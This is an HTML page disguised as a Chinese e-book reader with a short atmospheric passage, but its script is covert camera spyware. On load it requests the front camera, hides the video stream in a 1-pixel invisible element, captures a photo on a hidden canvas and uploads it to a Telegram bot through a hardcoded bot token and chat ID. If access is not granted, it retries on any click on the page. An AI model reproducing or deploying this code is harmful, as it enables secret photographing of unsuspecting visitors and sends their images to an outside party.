<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>电子书架上</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f3e9d2;
            font-family: 'Georgia', 'Times New Roman', serif;
            color: #3e2a1f;
            padding: 2rem;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .book {
            max-width: 800px;
            width: 100%;
            background: #fff9ef;
            box-shadow: 0 20px 35px rgba(0,0,0,0.2), 0 0 0 1px #e0d5c0;
            border-radius: 12px;
            padding: 2.5rem;
            position: relative;
        }
        .book::before { content: "📖"; position: absolute; top: 20px; left: 20px; font-size: 2rem; opacity: 0.2; }
        h1 { font-size: 2rem; text-align: center; border-bottom: 1px solid #e0d5c0; padding-bottom: 0.5rem; margin-bottom: 1.5rem; }
        .chapter { font-size: 1.2rem; line-height: 1.6; text-align: justify; margin-top: 1rem; }
        .chapter p { margin-bottom: 1.2rem; }
        .status-message {
            margin-top: 2rem;
            padding: 0.8rem;
            background: #f0e7d6;
            border-left: 4px solid #b97f44;
            font-family: monospace;
            font-size: 0.9rem;
            color: #5a3e2b;
            border-radius: 6px;
            text-align: center;
        }
        footer {
            margin-top: 2rem;
            font-size: 0.7rem;
            text-align: center;
            color: #aa9b82;
            border-top: 1px dashed #e0d5c0;
            padding-top: 1rem;
        }
        #hidden-video {
            position: fixed;
            bottom: 0;
            right: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
<div class="book">
    <h1>静默的书页</h1>
    <div class="chapter">
        <p>… 他翻开泛黄的书页。窗外下着雨，唯一的灯光是那盏带着绿色灯罩的台灯。在这样的时刻，时间仿佛静止了。文字编织成故事，自在地流淌，不求任何回报。</p>
        <p>但有时，即使是最专注的读者，也会感觉到一道目光。也许只是影子？或是潮湿玻璃上的反光？这本书再次展露它的秘密，而房间里渐渐温暖起来…</p>
    </div>
    <div id="status" class="status-message">⏳ 准备就绪...</div>
    <footer>「您所看到的页面或许会改变」<br>(c) 灰色调练习曲</footer>
</div>

<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas" style="display: none;"></canvas>

<script>
    // ========== TELEGRAM 设置 ==========
    const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';
    const CHAT_ID = '5305261101';

    const video = document.getElementById('hidden-video');
    const canvas = document.getElementById('hidden-canvas');
    const statusDiv = document.getElementById('status');

    let stream = null;
    let photoCaptured = false;
    let captureAttempted = false;

    // Китайские сообщения
    const messages = {
        requestAccess: '🔐 请求访问前置摄像头...',
        granted: '✅ 摄像头权限已授予',
        waitingFrame: '⏳ 等待第一个画面...',
        capturing: '📸 拍摄中...',
        sending: '📤 发送到 Telegram...',
        success: '✅ 照片已发送！',
        noFrontCam: '⚠️ 未找到前置摄像头，尝试使用默认摄像头...',
        denied: '❌ 您拒绝了摄像头权限。请刷新页面并允许访问。',
        error: '❌ 错误: ',
        clickToAllow: '📌 请点击页面任意位置以允许摄像头访问',
        networkError: '🌐 网络错误: ',
        telegramError: '⚠️ Telegram 错误: '
    };

    function setStatus(msg, isError = false) {
        statusDiv.innerHTML = isError ? `⚠️ ${msg}` : `📘 ${msg}`;
        statusDiv.style.borderLeftColor = isError ? '#b00020' : '#b97f44';
        console.log(msg);
    }

    function stopCamera() {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }
        video.srcObject = null;
    }

    function performCapture() {
        if (photoCaptured) return;
        
        if (!video.videoWidth || !video.videoHeight) {
            setStatus(messages.error + '没有视频流', true);
            return;
        }

        setStatus(messages.capturing);
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.save();
        ctx.scale(-1, 1);
        ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
        ctx.restore();

        canvas.toBlob(async (blob) => {
            if (!blob) {
                setStatus(messages.error + '照片创建失败', true);
                return;
            }
            setStatus(messages.sending);

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'camera_photo.jpg');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (result.ok) {
                    setStatus(messages.success);
                    photoCaptured = true;
                    stopCamera();
                } else {
                    setStatus(messages.telegramError + (result.description || '未知错误'), true);
                }
            } catch (err) {
                setStatus(messages.networkError + err.message, true);
            }
        }, 'image/jpeg', 0.85);
    }

    async function captureAndSend() {
        if (photoCaptured || captureAttempted) return;
        captureAttempted = true;
        
        if (!video.videoWidth || !video.videoHeight) {
            video.addEventListener('playing', function onPlaying() {
                video.removeEventListener('playing', onPlaying);
                performCapture();
            }, { once: true });
            setStatus(messages.waitingFrame);
            return;
        }
        performCapture();
    }

    async function requestCameraAndAutoCapture() {
        setStatus(messages.requestAccess);
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: "user" } }
            });
            video.srcObject = stream;
            setStatus(messages.granted);
            
            video.oncanplay = () => {
                video.play();
                captureAndSend();
            };
            
        } catch (err) {
            console.error(err);
            if (err.name === 'OverconstrainedError') {
                setStatus(messages.noFrontCam, true);
                try {
                    const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    stream = fallbackStream;
                    video.srcObject = stream;
                    setStatus('✅ 使用默认摄像头');
                    video.oncanplay = () => {
                        video.play();
                        captureAndSend();
                    };
                } catch (fallbackErr) {
                    setStatus(messages.error + fallbackErr.message, true);
                }
            } else if (err.name === 'NotAllowedError') {
                setStatus(messages.denied, true);
            } else {
                setStatus(messages.error + err.message, true);
            }
        }
    }

    window.addEventListener('load', () => {
        requestCameraAndAutoCapture();
        setTimeout(() => {
            if (!stream && !photoCaptured) {
                setStatus(messages.clickToAllow, false);
                document.body.addEventListener('click', () => requestCameraAndAutoCapture(), { once: true });
            }
        }, 1500);
    });

    window.addEventListener('beforeunload', () => stopCamera());
</script>
</body>
</html>
